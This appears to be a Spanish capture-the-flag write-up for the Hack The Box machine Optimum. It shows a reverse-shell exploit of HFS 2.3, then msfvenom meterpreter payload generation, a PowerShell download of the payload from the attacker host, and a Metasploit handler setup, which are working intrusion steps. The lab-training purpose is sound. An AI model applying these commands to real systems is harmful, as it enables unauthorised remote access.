---
title:  "Optimum - Hack The Box"
classes: wide
description: Optimum es una máquina sencilla basada en vulnerar una versión obsoleta de Windows. Para obtener la shell inicial hemos vulnerado la versión 2.3 de HTTP File Server. Desde aqui hemos ejecutado herramientas automatizadas adaptandonos al enotno del sistema operativo y buscando soluciones para poder escalar privilegios en esta versión concreta.
![styled-image](https://haoxgit.github.io/haox/assets/images/optimum/Optimum.png){: .align-right style="width: 25%;"}
---

![styled-image](https://haoxgit.github.io/haox/assets/images/optimum/Optimum.png){: .align-center style="width: 75%;"}

Optimum es una máquina sencilla basada en vulnerar una versión obsoleta de Windows. Para obtener la shell inicial hemos vulnerado la versión 2.3 de HTTP File Server. Desde aqui hemos ejecutado herramientas automatizadas adaptandonos al enotno del sistema operativo y buscando soluciones para poder escalar privilegios en esta versión concreta.

**Portscan**
```
sudo nmap -sC -sV -p- 10.10.10.8   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 11:57 CEST
Nmap scan report for 10.10.10.8
Host is up (0.054s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.59 seconds
```

<br>
**Web**

Accediendo al sitio web confirmamos la presencia del servicio HTTPFileServer que habíamos visto en el escaneo nmap.

![image-left](https://haoxgit.github.io/haox/assets/images/optimum/web.png){: .align-center}

Hemos utilizado searchsploit para detectar vulnerabilidades relacionadas con la versión actual.
```
┌──(kali㉿kali)-[~/htb/optimum]
└─$ searchsploit httpfileserver
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
----------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)       | windows/webapps/49125.py
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

<br>
**Shell de Usuario**

Adicionalmente podemos realizar una busqueda en google tal como "HttpFileServer exploit" y nos apareceran otros tantos como por ejemplo <a href="https://www.exploit-db.com/exploits/49584">CVE-2014-6287</a>

Para poder ejecutar el script debemos de modificar el valor lhost y lport por nuestra IP local y el puerto a la escucha que vamos a usar para recibir la shell. Los valores rhost y rport corresponderan a la máquina víctima, en este caso:
```
lhost = "10.10.14.10"
lport = 4444
rhost = "10.10.10.8"
rport = 80
```

Para ejecutar el exploit simplemente realizaremos:
```
python3 hfs.py
```

En nuestro netcat a la escucha deberíamos obtener una shell.
```
┌──(kali㉿kali)-[~/htb/optimum]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49163

PS C:\Users\kostas\Desktop> whoami
optimum\kostas
```

<br>
**Escalada de privilegios**

Para comenzar a enumerar posibles vectores de escalada de privilegios hemos ejecutado la herramienta <a href="https://github.com/peass-ng/PEASS-ng">WinPEAS</a>. Tras ejecutar la herramienta apreciamos información interesante como por ejemplo la credencial en texto plano del usuario kostas.

![image-left](https://haoxgit.github.io/haox/assets/images/optimum/user.png){: .align-center}

Algo de lo que deberíamos de darnos cuenta es de que la herramienta Watson no muestra ninguna salida al ejecutar WinPEAS.

Esto se debe a que la versión .NET del host no permite el uso de Watson (se necesita como mínimo la versión 4.5). Para comprobarlo podemos consultar los directorios de la siguiente ruta:

![image-left](https://haoxgit.github.io/haox/assets/images/optimum/net.png){: .align-center}

Lo que debemos de hacer en casos como este es recurrir a su predecesor <a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a>

En mi caso me econtre un error ya que la shell que nos ha propocionado el exploit de HttpFileServer no es lo suficientemente estable. Como bypass de este problema podemos generar una shell meterpreter desde nuestra máquina atacante.
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.10 LPORT=443 -f exe -o met.exe
```

Para compartir la shell podemos ejecutar un servidor http con python
```
python3 -m http.server 80
```

Aprovechando la shell PS que ya tenemos descargamos el payload del siguiente modo
```
iwr -uri http://10.10.14.10/met.exe -outfile met.exe
```

Por parte de nuestra máquina atacante a la escucha deberemos de utilizar el multi/handler de msfconsole y definir los siguientes parámetros.
```
set lhost <IP de nuestra máquina atacante>

set lport <puerto a la escucha de nuestra máquina atacante>

set payload windows/x64/meterpreter_reverse_https
```

Tras esto obtendremos una shell estable desde la cual podremos ejecutar la herramienta Sherlock. 

![image-left](https://haoxgit.github.io/haox/assets/images/optimum/Sherlock.png){: .align-center}

Para explotar las vulnerabilidades encontradas he decidido utilizar el exploit MS16-135.
![image-left](https://haoxgit.github.io/haox/assets/images/optimum/exploit.png){: .align-center}

